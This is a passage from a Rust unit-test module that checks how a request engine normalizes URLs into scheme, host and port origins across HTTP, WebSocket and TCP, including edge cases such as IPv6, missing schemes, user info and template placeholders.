        assert_eq!(origin("https://Example.com/a?b", Protocol::Http), Some("https://example.com:443".into()));
        assert_eq!(origin("http://example.com:8080", Protocol::Http), Some("http://example.com:8080".into()));
        // Without a scheme, the engine sends with the protocol's first one.
        assert_eq!(origin("example.com/a", Protocol::Http), Some("https://example.com:443".into()));
        assert_eq!(origin("wss://example.com/socket", Protocol::WebSocket), Some("wss://example.com:443".into()));
        assert_eq!(origin("tcp://10.0.0.1:7000", Protocol::Tcp), Some("tcp://10.0.0.1:7000".into()));
        assert_eq!(origin("http://[::1]:8080/", Protocol::Http), Some("http://[::1]:8080".into()));
        assert_eq!(origin("not a url", Protocol::Http), None);
        assert_eq!(origin("https://user@example.com/", Protocol::Http), None, "the engine refuses it");
        assert_eq!(origin("https://{{$uuid}}.example.com/", Protocol::Http), None);
        assert_eq!(origin("https://example.com/{{$uuid}}", Protocol::Http), Some("https://example.com:443".into()));
        let unknown = Binding::of(&ExecutionContext::standalone(RequestSpec::http("GET", "https://{{$uuid}}/")));
        assert!(!unknown.matches(&Binding::of(&ExecutionContext::standalone(RequestSpec::http("GET", "https://{{$uuid}}/")))));
    }
}
